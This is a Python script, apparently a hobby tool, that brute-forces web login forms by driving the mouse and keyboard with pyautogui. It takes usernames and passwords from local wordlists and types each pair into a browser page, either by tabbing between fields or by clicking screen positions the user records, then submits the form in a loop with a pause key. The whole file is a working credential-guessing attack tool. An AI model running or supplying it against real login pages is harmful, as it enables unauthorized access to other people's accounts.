import pyautogui as py
import time
import os
from pynput import keyboard








#imported code initial grapix
from name_grapix import name
name()
n=input("Do you want to continue (Y/N) : ")
if n in ['Y','y']:
    pass
else:
    exit()

#Execution failsafe control
breaker=False

#Failsafe
def failsafe(key):
    global breaker
    if key==keyboard.Key.esc:
        breaker=True

#defined most useed commands as a function
    
def clr():
    os.system('cls')
clr()
list=os.listdir('./Wordlists')
def mover():
    py.press('tab')
    return True

print("Your scrren resolution:",py.size())
listoffield=[]
submitpos=[]


#mode selection page code

print("Choose Bruteforce Option \n1.Tabber\n2.Position-clicker\n3.Exit\nKnow more about the options on Github page ")
mode=int(input("Enter ur choice : "))
clr()
def wordlist_list():
    print("List of worlists")
    for i in range(len(list)):
        print(i,".",list[i])
user_word=''
pass_word=''


#Worlist selecter function
def word_sel():
    wordlist_list()
    global user_word,pass_word
    user_word_I=int(input("Select a wordlist for username field : "))
    user_word="./Wordlists/"+list[user_word_I]
    pass_word_I=int(input("Select a wordlist for password field : "))
    pass_word="./Wordlists/"+list[pass_word_I]





#function to get mouse positio
def position_getter():
    for i in range(2):
        clr()
        print("Script will capture cursor location in 3 sec after confirmation")
        coef=input("Are You ready to select field (y/n): ")
        if coef in ['Y','y']:
            time.sleep(3)
            x, y = py.position()
            py.click()
            print("captured coor \nx:",x,"\ny:",y)
            time.sleep(3)
            listoffield.append((x,y))
        else:
            exit()
    coef=input("Are youo ready to select submit button :")
    time.sleep(3)
    x, y = py.position()
    py.click()
    print("Is your coor correct\nx:",x,"\ny:",y)
    submitpos.append((x,y))
    print(listoffield)
    print(submitpos)


#main bruteforcer function for tabber mode
def bruteforcer():
    global breaker
    with keyboard.Listener(on_press=failsafe) as listener:
        if not breaker:
            with open(pass_word, 'r', newline="") as csvfile:
                with open(user_word,'r',newline='') as csvuser:
                    content = csvfile.readlines() 
                    usertry=csvuser.readlines()
                    print("Keep ur mouse over the bruteforce site browser\nOpening the bruteforce target page in 10s")
                    time.sleep(10)
                    py.click()
                    for i in range(len(content)):
                        cur_user=usertry[i]
                        for j in range(len(content)):
                            if not breaker:
                                cur_pass=content[j]
                                print(cur_user,"\n",cur_pass)
                                if mover():
                                    time.sleep(.01)
                                    py.write(cur_user)
                                    time.sleep(.01)
                                    if mover():
                                        time.sleep(.01)
                                        py.write(cur_pass[0:-1])
                                        #py.click(submitpos[0][0],submitpos[0][1])
                                        #time.sleep(3)
                                        #py.click(submitpos[0][0],submitpos[0][1])
                                        if mover():
                                            py.press("enter")
                                            time.sleep(.2)
                                            print(i)
                            else:
                                resume=input("Press Enter Key to resume type exit to exit")
                                if resume not in ["EXIT","Exit","exit"]:
                                    print("Resuming in 10s")
                                    time.sleep(10)
                                    breaker=False
                                else:
                                    break


        listener.join()


#main bruteforcer function for position clicker mode
def posbruteforcer():
    global breaker
    with keyboard.Listener(on_press=failsafe) as listener:
        with open(pass_word, 'r', newline="") as csvfile:
            with open(user_word,'r',newline='') as csvuser:
                content = csvfile.readlines() 
                usertry=csvuser.readlines()
                print("Open the bruteforce target page in 10s")
                time.sleep(10)
                for i in range(len(content)):
                    cur_user=usertry[i]
                    for j in range(len(content)):
                        if not breaker:
                            cur_pass=content[j]
                            py.click(listoffield[0][0],listoffield[0][1])
                            time.sleep(.01)
                            py.write(cur_user)
                            time.sleep(.01)
                            py.click(listoffield[1][0],listoffield[1][1])
                            time.sleep(.01)
                            py.write(cur_pass[0:-1])
                            py.click(submitpos[0][0],submitpos[0][1])
                            #time.sleep(3)
                            #py.click(submitpos[0][0],submitpos[0][1])
                            time.sleep(.2)
                        else:
                            resume=input("Press Enter Key to resume type exit to exit")
                            if resume not in ["EXIT","Exit","exit"]:
                                print("Resuming in 10s")
                                time.sleep(10)
                                breaker=False
                            else:
                                break
        listener.join()
word_sel()  

#mode selector 
if mode==1:
    bruteforcer()
elif mode==2:
    position_getter()
    posbruteforcer()
else:
    exit()
